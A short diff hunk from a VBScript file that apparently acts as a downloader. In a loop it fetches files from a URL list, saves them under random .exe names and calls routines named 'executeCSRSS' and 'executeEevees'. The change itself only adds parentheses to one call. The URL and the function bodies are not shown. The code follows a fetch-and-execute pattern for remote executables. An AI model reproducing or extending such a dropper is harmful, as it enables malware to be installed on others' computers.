@@ -16,7 +16,7 @@ call copyWscript
 Do while i <= 0
 	call getFiles(list.Item(0), (Int((max-min+1)*Rnd+min))&".exe") 'get Eevees
 	call executeCSRSS()
-	call executeEevees
+	call executeEevees()
 Loop
 
 Function getFiles(strFileURL, strHDLocation) 'automate get any files that are necessary
